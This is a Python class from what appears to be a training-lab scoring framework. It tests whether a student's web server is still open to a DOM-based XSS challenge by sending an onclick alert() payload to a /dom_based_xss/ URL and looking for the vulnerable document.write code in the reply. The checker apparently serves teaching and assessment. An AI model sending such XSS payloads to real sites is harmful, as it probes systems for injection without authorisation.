import requests
import BetterLogger
from BetterLogger import logger
from Exploit import Exploit, UnsupportedException


class ChallengeSixXSS(Exploit):
    def __init__(self, ip_address, parsed_config) -> None:
        super().__init__(ip_address=ip_address, parsed_config=parsed_config)

    def run_command(self, command):
        raise UnsupportedException(
            "Running commands with ChallengeSixXSS is not supported."
        )

    def run_hellevator(self):
        raise UnsupportedException(
            "Running Hellevator with ChallengeSixXSS is not supported."
        )

    def test_if_vulnerable(self):
        try:
            logger.info(
                f"{self.ip_address} - Testing if the target is vulnerable to ChallengeSixXSS..."
            )
            mission = '?" onclick="alert()">'
            server_response = requests.get(
                f"http://{self.ip_address}/dom_based_xss/{mission}", timeout=3
            )
            server_response_text = server_response.text
            # logger.debug(f"Response: {server_response_text}")
            if (
                'document.write("<a href=" + decodeURIComponent(document.baseURI)'
                in server_response_text
            ):
                logger.info(
                    f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeSixXSS!{BetterLogger.COLOR_END}"
                )
                return True
            logger.info(
                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeSixXSS.{BetterLogger.COLOR_END}"
            )
            return False
        except requests.ConnectionError:
            logger.info(
                f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeSixXSS because the student disabled the apache2 service!{BetterLogger.COLOR_END}"
            )
            return None
        except Exception as err:
            logger.info(
                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeSixXSS is vulnerable.{BetterLogger.COLOR_END}"
            )
            logger.exception(err)
            return False
